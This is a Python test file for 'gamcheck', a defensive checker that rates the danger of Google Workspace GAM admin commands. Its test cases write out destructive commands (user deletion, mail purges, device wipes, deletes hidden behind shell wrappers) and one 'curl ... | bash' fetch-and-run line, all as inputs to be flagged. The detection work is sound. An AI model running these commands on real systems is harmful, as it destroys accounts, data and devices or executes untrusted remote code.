#!/usr/bin/env python3
"""Self-checks for gamcheck.py. Run: python3 developers/test_gamcheck.py

Each fixture declares its expected verdict on an 'expect:' line. The verb
coverage test fails when a GAM release adds a verb with no danger level, so a
new verb can never default to read-only.
"""
import json
import os
import re
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
# gamcheck.py sits one level up, beside verbs/, so end users see only what they run.
ROOT = HERE.parent
sys.path.insert(0, str(ROOT))

import gamcheck as g  # noqa: E402

FIXTURES = HERE / 'fixtures'


def test_fixture_verdicts(checker):
    """Every fixture's verdict matches its expect: line."""
    failures = []
    fixtures = [p for p in sorted(FIXTURES.iterdir()) if p.suffix != '.csv']
    for p in fixtures:
        m = re.search(r'expect:\s*([A-Z -]+?)\s*$', p.read_text(encoding='utf-8'), re.M)
        assert m, f'{p.name} has no expect: line'
        got = g.LEVEL_NAMES[g.verdict(checker.check_file(p))]
        if got != m.group(1):
            failures.append(f'{p.name}: expected {m.group(1)}, got {got}')
    assert not failures, '\n'.join(failures)
    return len(fixtures)


def test_details(checker):
    """Spot checks that the explanation, not just the verdict, is right."""
    def findings(name):
        return checker.check_file(FIXTURES / name)

    csv_loop = findings('csv_loop.sh')
    assert any('3 rows' in f.what and f.level == g.DESTRUCTIVE for f in csv_loop), csv_loop

    chrome = findings('chromeos.sh')
    assert [f.level for f in chrome if f.command] == [g.CHANGES, g.DESTRUCTIVE], chrome

    legacy = findings('legacy.sh')
    assert any('legacy GAM 6.58' in f.note for f in legacy), legacy

    suspend = findings('suspend.ps1')
    assert sum(1 for f in suspend if 'suspends' in f.what) == 1, suspend

    wrapper = findings('wrapper.py')
    assert any(f.level == g.DESTRUCTIVE and 'Gmail messages' in f.what for f in wrapper), wrapper

    fstring = findings('fstring.py')
    assert any('suspends the account' in f.note for f in fstring), fstring

    forward = findings('forward.sh')
    assert any(f.security for f in forward), forward

    echo = findings('echo_only.sh')
    assert not any('frank' in f.command for f in echo), echo

    offboard = findings('offboard.sh')
    assert any('30 days' in f.undo for f in offboard), offboard

    batch = findings('batch_follow.sh')
    assert any('stale@example.com' in f.command and 'cleanup.txt' in f.file for f in batch), batch

    # A report narrowed to one user, an OU or a selection is not tenant-wide; only an unnarrowed one is.
    def what(text):
        return [f.what for f in checker.check_text(text, '', 'shell') if f.command]
    assert what('gam report login user user@example.com start 2026-08-01\n') == ['reads audit report, for user user@example.com']
    assert what('gam report drive ou /Staff\n') == ['reads audit report, for the users in OU /Staff']
    assert what('gam report admin select group staff@example.com\n') == ['reads audit report, for the users selected by group staff@example.com']
    assert what('gam report usage user user user@example.com\n') == ['reads audit report, for user user@example.com']
    assert what('gam report login user all\n') == ['reads audit report, for the whole tenant']
    assert what('gam report customer\n') == ['reads audit report, for the whole tenant']
    assert what('gam sendemail user@example.com subject hi\n') == ['sends email']

    # A stderr redirect is not an argument, and a gam path given to a file command is data, not a hidden gam run.
    assert what('gam info domain 2>&1 | head -3\n') == ['shows details of domain']
    assert what('gam print users 2>/dev/null\n') == ['lists user accounts']
    for line in ('[[ -x $GAMDIR/gam ]]\n', 'cp -a "$GAMDIR" "$backup"\n', 'ls ~/bin/gam7/gam\n'):
        assert not [f for f in checker.check_text(line, '', 'shell') if 'could not follow' in f.what], line
    for line in ('bash -c "gam delete user bob@example.com"\n', 'result="$(gam delete user bob@example.com)"\n'):
        assert [f for f in checker.check_text(line, '', 'shell') if 'could not follow' in f.what], line

    # A named mobile device is acted on without doit (verified on dev, 2026-10-06); only a query is gated.
    def level(text):
        return [f.level for f in checker.check_text(text, '', 'shell') if f.command]
    assert level('gam update mobile AbC123 action wipe\n') == [g.DESTRUCTIVE]
    assert level('gam delete mobile AbC123\n') == [g.DESTRUCTIVE]
    assert level('gam update mobile query email:user@example.com action wipe\n') == [g.READ]
    assert level('gam update mobile query:email:user@example.com action wipe\n') == [g.READ]
    assert level('gam update mobile query email:user@example.com action wipe doit\n') == [g.DESTRUCTIVE]

    # A paste that only runs a script is checked through the script it names.
    script = findings('script_follow.sh')
    assert any('cleanup.txt' in f.file and 'from batch_follow.sh run at' in f.note for f in script), script
    assert not any('no gam commands found' in f.what for f in script), script
    missing = findings('script_missing.sh')
    assert any('not-provided-audit.py, which was not provided' in f.what for f in missing), missing
    for line in ('python3 -m http.server', 'python3 -c "print(1)"', 'bash -c "ls"', 'ls ./x.py'):
        assert g.Checker._script_path(g._tokenise(line, 'shell')) is None, line
    for line, want in (('pwsh -ExecutionPolicy Bypass -File x.ps1', 'x.ps1'), ('sudo bash run', 'run'),
                       ('./x.sh -y', './x.sh'), ('A=1 python3 "$HOME/a b.py" --yes', '$HOME/a b.py')):
        assert g.Checker._script_path(g._tokenise(line, 'shell')) == want, line
    pasted = checker.check_text(f'python3 "{FIXTURES / "wrapper.py"}" --yes\n', '<pasted>', 'shell')
    assert any(f.level == g.DESTRUCTIVE and 'wrapper.py' in f.file for f in pasted), pasted


def test_gates_and_wording(checker):
    """GAM's own doit/preview gates, group membership actions, and 'delete' that only removes a link.

    Each expectation was read from GAM7 7.48.07 source; see DOIT_GATED and friends in gamcheck.py.
    """
    def one(cmd):
        found = checker.check_text(cmd + '\n', '<t>', 'shell')
        assert len(found) == 1, (cmd, found)
        return found[0]

    cases = [
        ('gam update group s@example.com sync members file u.txt', g.DESTRUCTIVE, 'not in the list'),
        ('gam update group s@example.com sync members addonly file u.txt', g.CHANGES, ''),
        ('gam update group s@example.com sync members file u.txt preview', g.READ, 'dry run'),
        ('gam update group s@example.com delete member bob@example.com', g.DESTRUCTIVE, 'removes members'),
        ('gam update group s@example.com clear member', g.DESTRUCTIVE, 'all members'),
        ('gam update group s@example.com add member bob@example.com', g.CHANGES, 'adds members'),
        ('gam update group s@example.com $ACTION member bob@example.com', g.UNKNOWN, 'runtime'),
        ('gam update group csvkmd ./m.csv keyfield group datafield email delete member csvdata email', g.DESTRUCTIVE,
         'removes members'),
        ('gam user bob@example.com print fullname', g.READ, 'lists user'),
        ('gam user bob@example.com delete groups', g.DESTRUCTIVE, 'removes user bob@example.com from groups'),
        ('gam user bob@example.com delete calendars c@example.com', g.CHANGES, 'calendars are kept'),
        ('gam user bob@example.com sync licenses 1010020020 addonly', g.CHANGES, 'addonly'),
        ('gam all users delete messages query older_than:1y', g.READ, 'no doit'),
        ('gam all users delete messages query older_than:1y doit', g.DESTRUCTIVE, 'max_to_delete'),
        ('gam all users delete messages query older_than:1y doit max_to_delete 0', g.DESTRUCTIVE, ''),
        ('gam user bob@example.com delete messages ids 123', g.DESTRUCTIVE, 'Restore data'),
        ('gam user bob@example.com delete messages query $Q', g.DESTRUCTIVE, 'runtime'),
        ('gam user bob@example.com delete drivefile 1abc', g.DESTRUCTIVE, 'Trash'),
        ('gam user bob@example.com delete drivefile 1abc purge', g.DESTRUCTIVE, 'purge'),
        ('gam user bob@example.com delete drivefile 1abc untrash', g.CHANGES, 'restores'),
        ('gam cros_sn 5CD1 issuecommand command wipe_users', g.READ, 'without doit'),
        ('gam cros_sn 5CD1 issuecommand command wipe_users doit', g.DESTRUCTIVE, 'erases'),
        ('gam delete device devices/abc', g.DESTRUCTIVE, 'devices/abc'),
        ('gam delete device query serial:123', g.READ, 'no doit'),
        ('gam delete device devicesn 123', g.READ, 'no doit'),
        ('gam delete user bob@example.com', g.DESTRUCTIVE, '20 days'),
    ]
    failures = []
    for cmd, level, text in cases:
        f = one(cmd)
        blob = ' '.join((f.what, f.note, f.undo))
        if f.level != level or text not in blob:
            failures.append(f'{cmd}: got {g.LEVEL_NAMES[f.level]} / {blob}')
    assert not failures, '\n'.join(failures)
    assert 'maxto' not in one('gam all users delete messages query x doit max_to_delete 0').note.replace('_', '')


def test_adversarial(checker):
    """Made-up and hostile commands stacked with trigger words.

    Two failure modes: a danger word placed where GAM reads it as data (a file
    called preview, a query of doit) must not lower the verdict; and a danger
    word inside an address or quoted text must not raise a real read to a warning.
    FLOOR: the verdict must be at least this severe (CANNOT TELL clears CHANGES,
    not DESTRUCTIVE). EXACT: must be exactly this.
    """
    severity = {g.READ: 0, g.CHANGES: 1, g.UNKNOWN: 2, g.DESTRUCTIVE: 3, g.SUSPICIOUS: 4}
    floor = [
        ('gam delete users sync calendars', g.DESTRUCTIVE),
        ('gam users sync delete groups', g.DESTRUCTIVE),
        ('gam update group s@example.com sync member file preview', g.DESTRUCTIVE),
        ('gam update group preview@example.com sync member file u.txt', g.DESTRUCTIVE),
        ('gam update group s@example.com sync member removeonly file addonly', g.DESTRUCTIVE),
        ('gam user bob@example.com sync licenses addonly removeonly', g.DESTRUCTIVE),
        ('gam user bob@example.com delete drivefile untrash', g.DESTRUCTIVE),
        ('gam user bob@example.com delete drivefile query "name contains \'untrash\'"', g.DESTRUCTIVE),
        ('gam csvkmd users e.csv keyfield u subkeyfield c datafield id delete event calendars csvsubkey c events csvdata id doit',
         g.DESTRUCTIVE),
        ('gam cros_sn 5CD1 issuecommand command wipe_users doit', g.DESTRUCTIVE),
        ('gam print users && gam delete user x@example.com', g.DESTRUCTIVE),
        ('gam all users print users; gam delete user x@example.com', g.DESTRUCTIVE),
        ('gam print users | gam csv - gam delete user ~primaryEmail', g.DESTRUCTIVE),
        ('gam redirect stdout del.txt delete user x@example.com', g.DESTRUCTIVE),
        ('gam DeLeTe UsEr x@example.com', g.DESTRUCTIVE),
        ('gam delete_user x@example.com', g.CHANGES),
        ('gam update group s@example.com $ACTION member bob@example.com', g.UNKNOWN),
        ('gam $VERB user x@example.com', g.UNKNOWN),
        ('echo gam delete user x@example.com | sh', g.UNKNOWN),
        ('gam print users\necho gam delete user x@example.com | sh', g.UNKNOWN),
        ('gam batch -', g.UNKNOWN),
        ('gam delete print users', g.UNKNOWN),
        ('gam select delete save', g.CHANGES),
        # 2026-09-13 audit: doit as the first option (GAM's option loops are order-free)
        ('gam user bob@example.com delete messages doit query older_than:1y', g.DESTRUCTIVE),
        ('gam user bob@example.com trash messages doit matchlabel INBOX', g.DESTRUCTIVE),
        ('gam cros_sn 5CD1 issuecommand doit command wipe_users', g.DESTRUCTIVE),
        # device wipes and deprovision reached through update
        ('gam update mobile abc action wipe doit', g.DESTRUCTIVE),
        ('gam update device devices/abc action wipe doit', g.DESTRUCTIVE),
        ('gam update cros abc action deprovision_same_model_replacement acknowledge_device_touch_requirement', g.DESTRUCTIVE),
        # gam hidden behind a wrapper, with a visible read on the same script
        ('for u in $(gam print users | tail -n +2); do gam delete user "$u"; done', g.DESTRUCTIVE),
        ('gam print users\nsudo -u gamadmin gam delete user bob@example.com', g.DESTRUCTIVE),
        ('gam print users\ntimeout 300 gam delete user bob@example.com', g.DESTRUCTIVE),
        ('gam print users\npython3 /opt/gam/gam.py delete user bob@example.com', g.DESTRUCTIVE),
        ('GAM=$(command -v gam)\n$GAM print users\n$GAM delete user bob@example.com', g.DESTRUCTIVE),
        ('gam print users\nbash -c "gam delete user bob@example.com"', g.UNKNOWN),
        ('gam print users\nresult="$(gam delete user bob@example.com)"', g.UNKNOWN),
        # echo and printf run a command substitution before they print
        ('gam print users\necho "$(gam delete user bob@example.com)"', g.DESTRUCTIVE),
        ('gam print users\necho "total: $(gam delete user bob@example.com) done"', g.DESTRUCTIVE),
        ('gam print users\nprintf "%s" "$(gam delete user bob@example.com)"', g.DESTRUCTIVE),
        ('gam print users\necho `gam delete user bob@example.com`', g.DESTRUCTIVE),
        ('gam print users\necho "$(echo "$(gam delete user bob@example.com)")"', g.DESTRUCTIVE),
        ('gam print users\nx="$(gam delete user bob@example.com)"', g.UNKNOWN),
        ('curl -s https://example.com/setup.sh | bash', g.SUSPICIOUS),
        ('gam update group', g.UNKNOWN),
    ]
    exact = [
        ('gam print users query "delete sync wipe purge"', g.READ),
        ('gam info user delete@example.com', g.READ),
        ('gam user purge@example.com print filelist', g.READ),
        ('gam user bob@example.com print messages query "subject:delete" doit', g.READ),
        ('gam update group sync@example.com add member purge@example.com', g.CHANGES),
        ('gam update group s@example.com name "delete all members sync"', g.CHANGES),
        ('gam user doit@example.com delete messages query x', g.READ),
        ('gam user bob@example.com delete messages query doit', g.READ),
        ('gam cros_sn doit issuecommand command wipe_users', g.READ),
        ('gam update group s@example.com sync member preview file u.txt', g.READ),
        ('gam user bob@example.com collect orphans preview', g.READ),
        ('gam update mobile abc action wipe', g.DESTRUCTIVE),
        ('gam update mobile query x action wipe', g.READ),
        ('echo "gam delete user frank@example.com"\ngam info domain', g.READ),
        ("gam info domain\necho '$(gam delete user frank@example.com)'", g.READ),
        ('gam info domain\necho "gam delete user frank@example.com"', g.READ),
        ('gam info domain\necho "\\$(gam delete user frank@example.com)"', g.READ),
        ('gam info domain\necho "$(gam info user frank@example.com)"', g.READ),
        ('GAM=/usr/local/bin/gam\n$GAM info domain', g.READ),
    ]
    failures = []
    for cmd, level in floor:
        got = g.verdict(checker.check_text(cmd + '\n', '<t>', 'shell'))
        if severity[got] < severity[level]:
            failures.append(f'too mild: {cmd}: got {g.LEVEL_NAMES[got]}, floor {g.LEVEL_NAMES[level]}')
    for cmd, level in exact:
        got = g.verdict(checker.check_text(cmd + '\n', '<t>', 'shell'))
        if got != level:
            failures.append(f'wrong: {cmd}: got {g.LEVEL_NAMES[got]}, expected {g.LEVEL_NAMES[level]}')
    assert not failures, '\n'.join(failures)


def test_python_shell_strings(checker):
    """A shell=True string or os.system call is read whole, so a delete after && is not lost."""
    src = ('import os, subprocess\n'
           'subprocess.run("gam print users > u.csv && gam delete user bob@example.com", shell=True)\n')
    assert g.verdict(checker.check_text(src, '<t>', 'python')) == g.DESTRUCTIVE
    src = 'import os\nos.system("cd /opt && gam delete user bob@example.com")\n'
    assert g.verdict(checker.check_text(src, '<t>', 'python')) == g.DESTRUCTIVE
    src = 'import subprocess\ncmd = ["gam", "print", "users"]\ncmd[1] = "delete"\nsubprocess.run(cmd)\n'
    assert g.verdict(checker.check_text(src, '<t>', 'python')) == g.UNKNOWN
    # exec/compile of a literal is parsed (never run) and read; eval, and text that is not Python, are CANNOT TELL.
    head = 'import subprocess\nsubprocess.run(["gam", "print", "users"])\n'
    for call, want in (('exec("import os; os.system(\'gam delete user bob@example.com\')")', g.DESTRUCTIVE),
                       ('compile("import os; os.system(\'gam delete user bob@example.com\')", "f", "exec")', g.DESTRUCTIVE),
                       ('exec("exec(\\"import os; os.system(\'gam delete user bob@example.com\')\\")")', g.DESTRUCTIVE),
                       ('exec("import os; os.system(\'gam info domain\')")', g.READ),
                       ('exec("x = 1")', g.READ),
                       ('exec("import os; os.system(")', g.UNKNOWN),
                       ('eval("__import__(\'os\').system(\'gam delete user bob@example.com\')")', g.UNKNOWN)):
        found = checker.check_text(head + call + '\n', '<t>', 'python')
        assert g.verdict(found) == want, (call, g.LEVEL_NAMES[g.verdict(found)])
        assert all(f.line in (2, 3) for f in found), (call, [f.line for f in found])  # the exec line, not line 1 of the string


def test_crash_is_cannot_tell():
    """A checker bug must report CANNOT TELL (exit 2), never exit 1, which is the CHANGES code."""
    import contextlib
    import io
    tmp = FIXTURES.parent / 'local-samples'
    tmp.mkdir(exist_ok=True)
    p = tmp / '_crash.sh'
    p.write_text('gam print users\n', encoding='utf-8')
    saved = g.Checker.check_file
    g.Checker.check_file = lambda self, *a, **k: (_ for _ in ()).throw(RuntimeError('forced'))
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            assert g.main([str(p)]) == g.UNKNOWN
    finally:
        g.Checker.check_file = saved
        p.unlink()
    # CHK-15: paste mode is guarded the same way
    saved, stdin = g.Checker.check_text, sys.stdin
    g.Checker.check_text = lambda self, *a, **k: (_ for _ in ()).throw(RuntimeError('forced'))
    sys.stdin = io.TextIOWrapper(io.BytesIO(b'gam print users\n'))
    try:
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            assert g.main(['-']) == g.UNKNOWN
    finally:
        g.Checker.check_text, sys.stdin = saved, stdin
    # a CSV field over csv's size limit leaves the row count unknown instead of crashing
    import tempfile
    with tempfile.TemporaryDirectory() as d:
        (Path(d) / 'big.csv').write_text('email,x\nbob@example.com,' + 'y' * 200000 + '\n', encoding='utf-8')
        found = g.Checker().check_text('gam csv big.csv gam delete user ~email\n', '<t>', 'shell', [Path(d)])
        assert g.verdict(found) == g.DESTRUCTIVE, [f.what for f in found]


def test_checker_is_inert():
    """gamcheck itself imports nothing that runs programs or opens the network, and calls no exec/eval."""
    import ast
    tree = ast.parse((ROOT / 'gamcheck.py').read_text(encoding='utf-8'))
    allowed = {'argparse', 'fnmatch', 'ast', 'csv', 'json', 're', 'shlex', 'sys', 'dataclasses', 'pathlib', 'readline',
               'contextlib', 'io',
               'select', 'termios', 'msvcrt', 'time'}  # terminal input only: waiting for and discarding pasted lines
    imported = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported |= {a.name.split('.')[0] for a in node.names}
        elif isinstance(node, ast.ImportFrom):
            imported.add((node.module or '').split('.')[0])
        elif isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
            assert node.func.id not in ('exec', 'eval', 'compile', '__import__'), node.func.id
    assert imported <= allowed, f'unexpected imports: {imported - allowed}'


def test_verb_coverage():
    """Every verb word in all three GAM tables has a danger level."""
    missing = set()
    tables = g.Tables()
    aliases = {}
    for k in ('USER_COMMANDS_ALIASES', 'OAUTH2_SUBCOMMAND_ALIASES', 'COURSE_SUBCOMMAND_ALIASES',
              'CALENDAR_OLDACL_SUBCOMMAND_ALIASES', 'RESOURCE_SUBCOMMAND_ALIASES', 'COMMANDS_ALIASES'):
        aliases.update(tables.t[k])
    for name in ('gam7.json', 'gamadv-xtd3.json', 'legacy-gam.json'):
        data = json.loads((g.VERBS_DIR / name).read_text(encoding='utf-8'))
        for scope, verb, obj, _, _ in data['pairs']:
            word = obj if scope == 'audit' else verb  # audit monitor <create|delete|list>

            if word in g.WRAPPERS or word in ('csvtest',):
                continue
            if word not in g.VERB_LEVEL and aliases.get(word) not in g.VERB_LEVEL:
                missing.add(f'{name}:{scope}:{word}')
    assert not missing, 'verbs with no danger level: ' + ', '.join(sorted(missing))


def test_no_false_read_only(checker):
    """Positive control: a destructive command hidden among reads still wins the verdict."""
    tmp = FIXTURES.parent / 'local-samples'
    tmp.mkdir(exist_ok=True)
    p = tmp / '_control.sh'
    p.write_text('gam print users\n' * 50 + 'gam user x@example.com delete drivefile id\n', encoding='utf-8')
    try:
        assert g.verdict(checker.check_file(p)) == g.DESTRUCTIVE
    finally:
        p.unlink()


def test_paste():
    """Pasted text: shell is guessed from its syntax, curly quotes are flagged, a pipe needs no prompt."""
    import contextlib
    import io
    assert g.Checker.language(Path(''), 'gam print users `\n  query x\n') == 'powershell'
    assert g.Checker.language(Path(''), 'gam user %USER% show filters\n') == 'batch'
    assert g.Checker.language(Path(''), 'gam user "$u" show filters\n') == 'shell'

    def run(text, *args):
        out, err = io.StringIO(), io.StringIO()
        # cp1252 stands in for a Windows console pipe; the checker must still read UTF-8.
        stdin, sys.stdin = sys.stdin, io.TextIOWrapper(io.BytesIO(text.encode('utf-8')), encoding='cp1252')
        try:
            with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
                code = g.main(list(args))
        finally:
            sys.stdin = stdin
        return code, out.getvalue(), err.getvalue()

    code, out, err = run('gam user bob@example.com delete messages query “older_than:1y” doit\n', '--paste')
    assert code == g.DESTRUCTIVE and 'curly quotes' in out and 'Paste the' not in err, out + err
    code, out, _ = run('gam print users\n', '-')
    assert code == g.READ, out
    code, _, err = run('', '-')
    assert code == g.UNKNOWN and 'nothing was pasted' in err
    # CHK-01: lines still arriving after the blank line are read and checked, never left for the shell
    import builtins
    feed = iter(['gam print users', '', 'echo x; gam delete user bob@example.com\ngam info domain', ''])
    calls = []
    saved = builtins.input, g._input_pending, g._discard_input, sys.stdin
    builtins.input = lambda *a: next(feed)
    g._input_pending = lambda t: calls.append(t) or len(calls) < 2
    g._discard_input = lambda: calls.append('discard') or 'gam undelete user bob@example.com'  # pasted without Enter
    sys.stdin = type('Tty', (), {'isatty': staticmethod(lambda: True)})()
    try:
        err = io.StringIO()
        with contextlib.redirect_stderr(err):
            text = g.read_paste()
    finally:
        builtins.input, g._input_pending, g._discard_input, sys.stdin = saved
    assert 'gam delete user bob@example.com' in text and 'gam info domain' in text, text
    assert 'gam undelete user' in text, text
    assert '3 more pasted line' in err.getvalue() and 'discard' in calls, (err.getvalue(), calls)
    # A Ctrl+D typed while waiting in canonical mode is dropped by Linux once readline turns it off,
    # and input() hangs; so the wait runs with line editing off and puts the terminal back after
    if os.name == 'posix':
        import pty, select, termios
        master, slave = pty.openpty()
        seen, real_select, saved_stdin = [], select.select, sys.stdin
        sys.stdin = os.fdopen(slave, 'r', closefd=False)
        select.select = lambda *a: seen.append(termios.tcgetattr(slave)[3]) or real_select(*a)
        try:
            g._input_pending(0.01)
        finally:
            select.select, sys.stdin = real_select, saved_stdin
        after = termios.tcgetattr(slave)[3]
        os.close(master), os.close(slave)
        assert seen and not seen[0] & termios.ICANON and after & termios.ICANON and after & termios.ECHO, (seen, after)
        # a terminal gone between the blank line and the wait (ssh dropped) still gives a verdict, not a traceback
        with open(os.devnull) as null:
            saved_stdin, sys.stdin = sys.stdin, null
            try:
                g._input_pending(0.01)
            finally:
                sys.stdin = saved_stdin
    # Prompts copied from forum posts along with the command.
    for prompt in ('$ ', '> ', 'PS C:\\GAM7> ', 'C:\\GAM7>'):
        code, out, _ = run(prompt + 'gam user bob@example.com delete messages query x doit\n', '-')
        assert code == g.DESTRUCTIVE and 'curly' not in out, prompt + out


def corpus_findings(checker):
    """Every finding the checker gives on the fixtures and the blind set's shell lines."""
    import importlib.util
    spec = importlib.util.spec_from_file_location('blind_set', HERE / 'real-world' / 'blind-adversarial-2026-09-13' / 'blind_set.py')
    blind = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(blind)
    found = [f for p in sorted(FIXTURES.iterdir()) if p.suffix != '.csv' for f in checker.check_file(p)]
    for case in blind.CASES:
        if case[2] == 'shell':
            found += checker.check_text(case[1] + '\n', case[0], 'shell')
    return [f for f in found if f.command]


def test_invariants(checker):
    """Rules that hold for every command, so a new verb or a refactor cannot reopen a class of bug.

    narrowing: a command narrowed to a user, OU or selection is never described as tenant-wide.
    named target: a change to something written out in the command (an address, a path) names it.
    doit truth table: each doit-gated command, in its named and query forms, gets the level
    GAM7's own gate gives it (source cited per row; the named-device and purge rows were run on
    the dev tenant, 2026-10-06).
    polarity: switching something off never reads the same as switching it on.
    tenant guard: a change with no gam info domain check above it gets the NOTE; a guarded one does not.
    """
    found = corpus_findings(checker)
    assert len(found) > 150, len(found)  # positive control: the corpus really was read

    narrow = re.compile(r'\b(user|ou|org|orgunit|select)\s+(?!all\b)\S+', re.I)
    bad = [f'{f.command} -> {f.what}' for f in found if 'whole tenant' in f.what and narrow.search(f.command)]
    assert not bad, '\n'.join(bad)

    def targets(cmd):
        return [t.strip('"\'') for t in cmd.split()[1:] if re.search(r'@|^/', t.strip('"\''))]
    vague = [f'{f.command} -> {f.what}' for f in found
             if f.level in (g.CHANGES, g.DESTRUCTIVE) and targets(f.command) and '\n' not in f.command
             and not any(t in f.what for t in targets(f.command))
             and not re.search(r'listed in|selected by|runtime|each row|CSV|in the tenant|older GAM', f.what)]
    assert not vague, '\n'.join(vague)

    def level(cmd):
        return [f.level for f in checker.check_text(cmd + '\n', '<t>', 'shell') if f.command][0]
    R, C, D = g.READ, g.CHANGES, g.DESTRUCTIVE
    CHANGE = 'changes'  # CHANGES or DESTRUCTIVE, whichever the verb is; never a dry run
    DEVICE_VERBS = {'delete': ('device', 'deviceuser'), 'update': ('device', 'deviceuser'), 'wipe': ('device', 'deviceuser'),
                    'cancelwipe': ('device', 'deviceuser'), 'approve': ('deviceuser',), 'block': ('deviceuser',)}
    u = 'gam user bob@example.com'
    table = [  # (DOIT_GATED key, command, level)
        *[(('user', v, o), f'{u} {v} {o}s query x', R) for v in ('delete', 'modify', 'spam', 'trash', 'untrash', 'forward')
          for o in ('message', 'thread')],
        (('user', 'archive', 'message'), f'{u} archive messages query x', R),
        (('user', 'forward', 'message'), f'{u} forward messages ids 123 to carol@example.com', C),  # 75588 ids skip the gate
        *[(('user', v, o), f'{u} {v} {o}s ids 123', VERB) for v, VERB in (('delete', D), ('trash', D), ('spam', C))
          for o in ('message', 'thread')],  # 75224: explicit ids skip the gate
        (('user', 'delete', 'filerevision'), f'{u} delete filerevisions 1abc select 123', R),  # 59417 gated even by id
        (('user', 'update', 'filerevision'), f'{u} update filerevisions 1abc select 123 keepforever', R),
        (('user', 'delete', 'event'), f'{u} delete events primary eventid abc', R),  # 42390 gated even by id
        (('user', 'delete', 'event'), f'{u} delete events primary eventid abc doit', D),
        (('user', 'update', 'calattendees'), f'{u} update calattendees primary eventid abc delete carol@example.com', R),
        (('calendar', 'deleteevent', None), 'gam calendar c@example.com deleteevent id abc', R),
        (('calendar', 'delete', 'event'), 'gam calendar c@example.com delete event eventid abc', R),
        (('main', 'delete', 'mobile'), 'gam delete mobile AbC123', D),  # 33996 named: doit=True
        (('main', 'delete', 'mobile'), 'gam delete mobile query x', R),
        (('main', 'update', 'mobile'), 'gam update mobile AbC123 action wipe', D),
        (('main', 'update', 'mobile'), 'gam update mobile query:x action wipe', R),
        *[(('main', v, o), f'gam {v} {o} {n}' + (' action wipe' if v == 'update' else ''), CHANGE)
          for v, objs in DEVICE_VERBS.items()
          for o, n in (('device', 'devices/abc'), ('deviceuser', 'devices/abc/deviceUsers/def')) if o in objs],  # 31617, 31652
        *[(('main', v, o), f'gam {v} {o} query x' + (' action wipe' if v == 'update' else ''), R)
          for v, objs in DEVICE_VERBS.items() for o in objs],
        (None, f'{u} purge events primary matchfield summary x', D),  # 42889: not gated, destroys events
        (None, 'gam calendar c@example.com purge event query x', D),
        (None, 'gam delete device devicesn 123', R),
    ]
    def ok(got, want):
        return got in (C, D) if want == CHANGE else got == want
    wrong = [f'{cmd}: got {g.LEVEL_NAMES[level(cmd)]}, expected {want if want == CHANGE else g.LEVEL_NAMES[want]}'
             for _, cmd, want in table if not ok(level(cmd), want)]
    assert not wrong, '\n'.join(wrong)
    uncovered = g.DOIT_GATED - {k for k, _, _ in table}
    assert not uncovered, f'doit-gated commands with no truth-table row: {uncovered}'

    def text(cmd):
        f = [f for f in checker.check_text(cmd + '\n', '<t>', 'shell') if f.command][0]
        return (f.what, f.note, f.security)
    for on, off in ((f'{u} forward on carol@example.com keep', f'{u} forward off'),
                    ('gam update user bob@example.com suspended on', 'gam update user bob@example.com suspended off'),
                    ('gam suspend user bob@example.com', 'gam unsuspend user bob@example.com'),
                    ('gam update group s@example.com add member bob@example.com',
                     'gam update group s@example.com remove member bob@example.com')):
        assert text(on) != text(off), (on, text(on))
    assert not text(f'{u} forward off')[2], 'turning forwarding off is not a security change'

    unguarded = 'gam delete user bob@example.com\n'
    for script, expect in ((unguarded, 1), ('gam info domain\n' + unguarded, None),
                           ('gam info domain | grep -q "Customer ID: C000" || exit 1\n' + unguarded, None),
                           (unguarded + 'gam info domain\n', 1), ('gam print users\n', None)):
        assert g.tenant_unguarded(checker.check_text(script, '<t>', 'shell'), '<t>') == expect, script


def test_modes(checker):
    """A followed script run with a mode argument is judged by the branch that mode runs.

    Lines in other modes' branches are set aside as not run; anything the checker cannot read
    about the mode counts every line, so the verdict is never milder than the script.
    """
    def run(name, *args):
        line = ' '.join(['bash', f'"{FIXTURES / name}"', *args]) + '\n'  # quoted: a Windows path's backslashes
        found = checker.check_text(line, '<p>', 'shell')
        counted = [f for f in found if f.command.startswith('gam') and not f.aside]
        notes = [f.what for f in found if f.aside == 'note']
        return g.verdict(found), counted, notes

    v, counted, _ = run('modes_if.sh', 'check')
    assert v == g.READ and len(counted) == 4, counted
    v, counted, _ = run('modes_if.sh')  # no argument: the ${1:-check} default
    assert v == g.READ, counted
    v, counted, _ = run('modes_if.sh', 'create')
    assert v == g.CHANGES and sum('creates user' in f.what for f in counted) == 2, counted
    assert not any('group' in f.what for f in counted), counted
    v, counted, _ = run('modes_if.sh', 'finish')
    assert v == g.CHANGES and sum('adds members' in f.what for f in counted) == 2, counted
    assert not any('creates user' in f.what for f in counted), counted
    v, counted, _ = run('modes_if.sh', 'typo')
    assert v == g.READ, counted

    assert run('modes_case.sh', 'check')[0] == g.READ
    assert run('modes_case.sh', 'remove')[0] == g.DESTRUCTIVE
    assert run('modes_case.sh')[0] == g.READ  # "$1" empty: only the *) branch

    assert run('modes_nested.sh')[0] == g.READ
    assert run('modes_nested.sh', 'apply')[0] == g.CHANGES
    assert run('modes_nested.sh', 'apply', 'wipe')[0] == g.DESTRUCTIVE

    v, _, notes = run('modes_unresolved.sh', 'check')
    assert v == g.DESTRUCTIVE and any('every line counted' in x for x in notes), notes
    v, _, notes = run('modes_if.sh', '"$WHICH"')  # mode decided at runtime
    assert v == g.CHANGES and any('every line counted' in x for x in notes), notes

    def text(src, *args):
        return g.verdict(checker.check_text(src, '<t>', 'shell', argv=list(args)))
    dangerous = 'gam info domain\nif [ "$MODE" = check ]; then\n  gam print users\nelse\n  gam delete user x@example.com\nfi\n'
    assert text('MODE=$1\n' + dangerous, 'check') == g.READ
    for prefix in ('MODE=$1\nMODE=delete\n', 'MODE=$1\nshift\n', 'read MODE\n', 'f() {\n  MODE=$1\n}\n'):
        assert text(prefix + dangerous, 'check') == g.DESTRUCTIVE, prefix
    assert text('MODE=$1\n[ "$MODE" = check ] || gam delete user x@example.com\n', 'check') == g.DESTRUCTIVE
    assert text('MODE=$1\n"$MODE"\n' + dangerous, 'check') == g.DESTRUCTIVE
    guard = 'MODE=${1:-}\ncase "$MODE" in check|go) ;; *) echo usage; exit 1;; esac\n'
    assert text(guard + dangerous, 'check') == g.READ  # a one-line usage guard does not block the reading
